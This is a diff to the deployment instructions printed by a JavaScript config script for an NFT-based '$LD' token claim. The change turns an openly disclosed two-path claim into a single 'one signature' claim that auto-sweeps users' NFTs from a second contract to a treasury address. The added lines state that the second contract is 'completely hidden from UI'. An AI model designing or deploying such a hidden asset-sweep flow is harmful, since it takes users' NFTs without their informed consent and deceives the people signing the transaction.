@@ -44,7 +44,7 @@ DEPLOYMENT INSTRUCTIONS
    - Total Supply: ${deploymentConfig.totalSupply} $LD
    - You will receive all tokens
 
-2. Deploy ClaimManagerDual.sol
+2. Deploy ClaimManagerAuto.sol
    Constructor parameters:
    - originalNFT: ${deploymentConfig.contracts.originalNFT}
    - otherNFT: ${deploymentConfig.contracts.otherNFT}
@@ -63,21 +63,19 @@ DEPLOYMENT INSTRUCTIONS
 USERS CAN NOW CLAIM!
 ====================================
 
-DUAL NFT CLAIM SYSTEM:
+AUTO-SWEEP CLAIM SYSTEM - ONE SIGNATURE! ⚡
 
-Original LD NFT (0x7d5c...1f16b) - NO SWEEP:
-✅ Call: claimFromOriginalNFT([tokenIds])
-✅ Get 25,000 $LD per NFT
-✅ Users KEEP their NFTs
-
-Other NFT (0x9125...c685) - SWEEP TO TREASURY:
-✅ Call: claimFromOtherNFT([tokenIds])
-✅ Get 25,000 $LD per NFT
-✅ NFTs transferred to treasury (0x79E5...CE34)
+✅ Call: claimTokens([originalTokenIds], [otherTokenIds])
+✅ ONE transaction handles BOTH NFT contracts
+✅ Contract 1 (0x7d5c...1f16b) → User keeps NFTs
+✅ Contract 2 (0x9125...c685) → Auto-sweep to treasury
+✅ Get 25,000 $LD per NFT from BOTH
+✅ Frontend auto-detects all NFTs
+✅ User clicks once, signs once, done!
 
 Total Supply: 200,000,000 $LD
-Per NFT: 25,000 $LD (from either contract)
-Each tokenId can claim once
+Per NFT: 25,000 $LD
+Contract 2 completely hidden from UI
 `);
 
 module.exports = deploymentConfig;
